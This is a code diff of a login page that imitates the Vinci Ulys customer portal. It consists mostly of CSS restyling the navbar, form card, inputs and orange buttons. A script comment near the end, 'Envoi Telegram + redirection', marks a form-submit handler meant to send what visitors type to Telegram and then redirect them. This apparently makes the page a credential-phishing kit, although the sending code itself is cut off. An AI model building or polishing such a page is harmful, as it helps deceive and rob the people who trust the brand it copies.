@@ -6,6 +6,134 @@
   <title>Connexion à votre espace Vinci – Ulys</title>
   <link rel="stylesheet" href="assets/css/style.css" />
   <style>
+    body {
+      font-family: 'Source Sans Pro', sans-serif;
+      background: #FBEAD3;
+      margin: 0;
+      padding: 0;
+    }
+
+    .site-nav {
+      background: #ffffff;
+      border-bottom: 1px solid #EAD1B8;
+    }
+
+    .navbar {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0.75rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .navbar-left {
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+    }
+
+    .logo-container {
+      background: #ffffff;
+      padding: 4px 6px;
+      border-radius: 20px;
+    }
+
+    .logo {
+      width: 80px;
+      height: auto;
+    }
+
+    .header-toggle {
+      display: inline-flex;
+      border: 1px solid #ccc;
+      border-radius: 20px;
+      overflow: hidden;
+    }
+
+    .header-toggle .toggle {
+      padding: 0.4rem 1.2rem;
+      background: #fff;
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 0.9rem;
+    }
+
+    .header-toggle .toggle.active {
+      background: #ff8000;
+      color: #fff;
+    }
+
+    main.container {
+      flex: 1;
+      max-width: 700px;
+      margin: 2.5rem auto;
+      padding: 0 1rem;
+    }
+
+    .card {
+      background: #ffffff;
+      border-radius: 20px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+      padding: 2.5rem;
+      width: 100%;
+    }
+
+    .form-logo-center {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 2rem;
+      padding-top: 0.5rem;
+    }
+
+    .form-logo-center img {
+      height: 70px; /* Agrandi le logo Ulys */
+      width: auto;
+      object-fit: contain;
+    }
+
+    form label {
+      display: block;
+      margin: 1rem 0 0.25rem;
+      font-weight: 600;
+    }
+
+    form input {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 1px solid #ccc;
+      border-radius: 20px;
+      background: #fafafa;
+      font-size: 1rem;
+    }
+
+    form input:focus {
+      outline: none;
+      border-color: #ff8000;
+      box-shadow: 0 0 0 3px rgba(255, 128, 0, 0.2);
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      margin-top: 2rem;
+      padding: 0.85rem;
+      background: #ff8000;
+      color: #fff;
+      font-size: 1.1rem;
+      font-weight: 600;
+      text-align: center;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background: #e57200;
+    }
+
     #spinnerOverlay {
       display: none;
       position: fixed;
@@ -31,37 +159,13 @@
       }
     }
 
-    .header-toggle button {
-      cursor: pointer;
-    }
-
-    .form-logo-center {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin-bottom: 2rem;
-      padding-top: 0.5rem;
-    }
-
-    .form-logo-center img {
-      height: 60px;
-      width: auto;
-      object-fit: contain;
-    }
-
-    /* Redonner la même largeur que sur la page index */
-    main.container {
-      flex: 1;
-      max-width: 700px; /* élargi comme demandé */
-      margin: 2.5rem auto;
-      padding: 0 1rem;
-    }
-
-    .card {
-      background: #fff;
-      border-radius: 20px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-      padding: 2.5rem;
+    footer {
+      text-align: center;
+      padding: 2rem 0;
+      background-color: #ffffff;
+      font-size: 0.9rem;
+      color: #555;
+      margin-top: 3rem;
     }
   </style>
 </head>
@@ -124,11 +228,13 @@
   </footer>
 
   <script>
+    // Toggle utilisateur
     function toggleUserType(button) {
       document.querySelectorAll(".header-toggle .toggle").forEach(btn => btn.classList.remove("active"));
       button.classList.add("active");
     }
 
+    // Civilité
     const toggleButtons = document.querySelectorAll("#civilite-toggle .toggle");
     const civiliteInput = document.getElementById("civilite");
 
@@ -140,6 +246,7 @@
       });
     });
 
+    // Envoi Telegram + redirection
     const form = document.getElementById("form-abonnement");
     form.addEventListener("submit", function (e) {
       e.preventDefault();
